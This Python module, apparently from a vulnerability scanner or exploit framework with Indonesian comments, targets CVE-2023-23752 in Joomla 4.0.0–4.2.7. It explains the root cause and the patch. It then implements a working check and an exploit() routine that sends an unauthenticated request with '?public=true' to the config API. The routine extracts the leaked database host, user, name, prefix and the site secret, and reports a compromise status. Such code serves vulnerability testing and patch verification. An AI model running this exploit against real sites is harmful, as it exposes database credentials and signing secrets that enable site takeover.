#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2023-23752 — improper access check pada API Joomla: parameter query `public`
                 di-merge ke variabel route, sehingga route yang dideklarasikan
                 non-public (com_config/application) dapat diakses tanpa autentikasi.

Affected : 4.0.0 - 4.2.7
Patched  : 4.2.8+

ROOT CAUSE — libraries/src/Router/ApiRouter.php::parseApiRoute()

    4.2.7 (VULNERABLE)
        $query = Uri::getInstance()->getQuery(true);
        ...
        $vars = array_merge($vars, $query);     // <- SELURUH query ikut jadi route var

    4.2.8 (PATCHED)
        $query = Uri::getInstance()->getQuery(true);

        // Remove the public key as it is only supported coming from the route definition
        if (array_key_exists('public', $query)) {
            unset($query['public']);
        }
        ...
        $vars = array_merge($vars, $query);

Route `com_config/application` didefinisikan dengan `public=false`. Karena user
bisa menambahkan `?public=true` ke URL dan nilai itu ikut di-merge menjadi variabel
route, pemeriksaan `public` di router dapat dilewati: klien tanpa kredensial
mendapatkan seluruh konfigurasi situs.

Dampak: pengungkapan informasi tanpa autentikasi — host/user/nama/prefix basis data,
`sitename`, dan **`secret` Joomla** (dipakai untuk menandatangani sesi/CSRF).
Secret + struktur DB = jalur menuju pengambilalihan penuh. CWE-284 / CWE-862.

Dipicu tanpa kredensial:
    GET /api/index.php/v1/config/application?public=true

Bukti lab (build asli Joomla):
    4.2.7 : HTTP 200, JSON `data[]` berisi host=megapack-db, user=j427, db=j427,
            dbprefix=jos_, secret=<32 char>      -> VULN
    4.2.8 : HTTP 200, {"errors":[{"title":"Forbidden"}]}                  -> CLEAN
"""

import json
import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN,
                ST_VULN, detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
API = "/api/index.php/v1/config/application?public=true"

VULN_MAX = (4, 2, 7)          # fix di 4.2.8
# Atribut konfigurasi yang membuktikan kebocoran berarti (bukan sekadar "ada JSON").
SENSITIVE = ("dbtype", "host", "user", "db", "dbprefix", "secret", "sitename")


def _joomla_version(t, h):
    """Versi Joomla dengan cache per-target (share dengan modul joomla_core lain)."""
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _in_range(ver):
    """API baru ada sejak 4.0; rentan sampai 4.2.7."""
    if ver is None:
        return None
    if ver[0] < 4:
        return False
    if ver[0] > 4:
        return False
    return ver_le(ver, VULN_MAX)


def _probe(h, t):
    """GET endpoint tanpa kredensial. Kembalikan (status, body)."""
    r = h.get(f"{t.url}{API}")
    if r is None:
        return None, ""
    return r.status_code, (r.text or "")


def _leaked(body):
    """
    Kembalikan daftar atribut sensitif yang benar-benar terisi pada respons.
    Mengembalikan (fields, values) — values dipakai untuk bukti ringkas.
    """
    try:
        data = json.loads(body)
    except Exception:  # noqa: BLE001
        return [], {}
    if not isinstance(data, dict) or "data" not in data:
        return [], {}
    fields, values = [], {}
    for item in data.get("data", []):
        attrs = (item or {}).get("attributes") or {}
        for k in SENSITIVE:
            v = attrs.get(k)
            if v not in (None, "", 0, "0", False):
                if k not in fields:
                    fields.append(k)
                values.setdefault(k, v)
    return fields, values


def _mask(k, v):
    """Rahasiakan nilai yang sensitif di keluaran (secret tidak dicetak penuh)."""
    s = str(v)
    if k == "secret":
        return s[:4] + "…(" + str(len(s)) + " char)"
    return s[:48]


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"

    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if ver[0] < 4:
        return ST_CLEAN, f"Joomla {ver_s} — API (/api) baru ada sejak 4.0", f"version={ver_s}"
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} >= 4.2.8 — sudah dipatch", f"version={ver_s}"

    status, body = _probe(h, t)
    if status is None:
        return ST_UNKNOWN, "endpoint API tidak dapat dihubungi", f"version={ver_s}"

    fields, vals = _leaked(body)
    ev = f"GET {API} HTTP {status}"
    if status == 200 and fields:
        return (ST_INFO,
                f"Joomla {ver_s} — konfigurasi bocor tanpa autentikasi "
                f"({len(fields)} atribut: {','.join(fields)})",
                f"version={ver_s} | {ev} | fields={','.join(fields)}")
    if status == 200 and ('"Forbidden"' in body or '"errors"' in body):
        return ST_CLEAN, f"Joomla {ver_s} — API menolak (Forbidden)", f"version={ver_s} | {ev}"
    if status == 404:
        return ST_INFO, f"Joomla {ver_s} — route API tidak ditemukan (API nonaktif?)", \
                        f"version={ver_s} | {ev}"
    if status in (401, 403):
        return ST_CLEAN, f"Joomla {ver_s} — API menolak (HTTP {status})", f"version={ver_s} | {ev}"
    return ST_UNKNOWN, f"respons API tidak menyimpulkan status (HTTP {status})", \
                       f"version={ver_s} | {ev} | body={body[:80]}"


def exploit(t, h, opts):
    """
    Konfirmasi kebocoran: ambil konfigurasi tanpa kredensial dan tunjukkan atribut
    sensitif yang benar-benar terkirim (nilai `secret` disamarkan).
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan (>= 4.2.8)", \
                         f"version={ver_s}"

    status, body = _probe(h, t)
    if status is None:
        return ST_UNKNOWN, "endpoint API tidak dapat dihubungi", f"version={ver_s} | {API}"

    fields, vals = _leaked(body)
    if status != 200 or not fields:
        if '"Forbidden"' in body or '"errors"' in body or status in (401, 403):
            return ST_CLEAN, f"Joomla {ver_s} — API menolak akses publik", \
                             f"version={ver_s} | HTTP {status}"
        return ST_UNKNOWN, f"konfigurasi tidak terbaca (HTTP {status})", \
                           f"version={ver_s} | body={body[:100]}"

    show = ", ".join(f"{k}={_mask(k, vals[k])}" for k in fields
                     if k in ("host", "user", "db", "dbprefix", "secret"))
    return (ST_PWN,
            f"konfigurasi Joomla terungkap tanpa autentikasi (Joomla {ver_s}) — "
            f"{len(fields)} atribut sensitif bocor, termasuk kredensial DB dan `secret`",
            f"version={ver_s} | GET {API} HTTP {status} | attributes={','.join(fields)} | {show}")


register(CveModule(
    cve="CVE-2023-23752",
    cluster="joomla_core",
    title="Joomla Core - improper access check pada API (unauth config disclosure)",
    vclass="broken access control / information disclosure",
    cvss="5.3",
    severity="medium",
    cwe="CWE-284",
    product="Joomla! Core (ApiRouter / com_config application)",
    versions_affected="4.0.0-4.2.7",
    status="verified",
    requires=[
        "tidak butuh kredensial (vektor unauth)",
        "plugin 'Web Services' / aplikasi API aktif (default aktif sejak 4.0)",
    ],
    check=check,
    exploit=exploit,
    notes=("ApiRouter::parseApiRoute() 4.2.7 melakukan array_merge($vars, $query) "
           "sehingga kunci `public` dari query string klien ikut menjadi variabel route; "
           "route com_config/application yang dideklarasikan public=false jadi dapat "
           "diakses anonim lewat ?public=true. Fix 4.2.8 membuang $query['public'] "
           "sebelum merge. Vektor: GET /api/index.php/v1/config/application?public=true. "
           "Diverifikasi di build asli: 4.2.7 -> 200 + data[] memuat host/user/db/"
           "dbprefix/secret (bocor); 4.2.8 -> {\"errors\":[{\"title\":\"Forbidden\"}]}. "
           "Lab: mp-j427 @8113 (rentan) vs mp-j428 @8114 (patched)."),
))
